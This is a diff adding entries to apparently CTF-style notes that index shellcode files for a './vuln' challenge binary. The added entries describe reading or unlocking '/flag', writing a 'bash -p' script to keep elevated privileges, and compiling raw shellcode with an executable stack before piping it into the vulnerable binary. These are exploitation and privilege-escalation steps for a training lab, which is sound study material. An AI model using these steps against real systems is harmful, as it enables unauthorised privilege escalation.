@@ -17,3 +17,27 @@
 4. shellcode.90-60.s
 
     - chmod 777 /flag
+
+5. shellcode.2-0-2-1.s
+
+    - if u cannot use 0,1,2 file descriptors
+
+6. shellcode.90.s
+    
+    - need to create symbolic link called "f"
+    - 13 bytes long shellcode that helps u to read flag
+    - don't worry if it shows u segfault error it still works
+
+7. shellcode.59(2).s
+    
+    - echo -ne "#!/bin/bash -p\n/bin/bash -p" > f
+    - 13 bytes long shellcode
+    - (cat shellcode-raw;cat) | ./vuln
+
+8. shellcode.105-59(2).s
+
+    - echo -ne "#!/bin/bash\n/bin/bash" > f
+    - 10 int3 instructions overwrite my shellcode after 10 bytes
+    - gcc -nostdlib -static -z execstack shellcode.105-59(2).s -o shellcode
+    - objcopy --dump-section .text=shellcode-raw shellcode
+    - (cat shellcode-raw;cat) | ./vuln
